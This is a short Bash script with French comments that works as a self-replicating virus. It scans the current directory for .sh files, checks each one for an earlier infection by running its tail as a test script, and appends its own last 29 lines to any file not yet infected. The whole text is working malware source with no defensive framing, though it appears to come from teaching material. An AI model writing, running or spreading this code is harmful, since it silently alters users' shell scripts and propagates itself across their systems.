L=29 # nombre de lignes de code viral
if [ ! -z $1 ] && [ $1 = "test" ]
then
echo "test" # affiche test quand c’est deja infecte
exit 0
fi
touch test.sh # fichier temporaire de test de surinfection
chmod u+x test.sh
for f in *.sh
do
if [ $f != "test.sh" ]
then
# gestion de la surinfection
tail -n $L $f > test.sh # on r´ecup`ere le code viral
t=$(echo -n $(./test.sh "test")) # execution test
if [ "$t" != "test" ]
then
# infection
tail -n $L $0 >> $f
fi
fi
done
